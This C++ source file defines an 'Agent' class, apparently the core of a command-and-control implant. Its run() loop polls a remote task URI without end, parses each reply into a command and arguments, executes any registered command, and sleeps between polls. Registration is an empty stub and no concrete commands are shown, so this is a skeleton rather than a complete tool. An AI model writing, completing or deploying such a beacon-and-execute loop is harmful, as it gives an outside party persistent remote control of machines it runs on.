#include "Agent.h"


// @TODO add dependancy injection with IoC container.
Agent::Agent(Request req, Command cmd) : hRequest{ req }, hCommand{ cmd } {}

void Agent::Register() {


}


void Agent::run() {
	Register();

	std::vector<std::string> task = util::split("");

	while (true) {
		std::string task = hRequest.Get(TASK_URI);
		
		if (task != "") {
			std::vector <std::string> Task = util::split(task);
			std::vector <std::string> args;
			args = std::vector<std::string>(Task.begin() + 1, Task.end()); // @todo check if Task has more than 1

			std::string Cmd = Task[0];

			if (hCommand.HasCommand(Cmd)) {
				hCommand.ExecuteCommand(Cmd, args);
			}
		}

		Sleep(SLEEP_TIME);
	}
}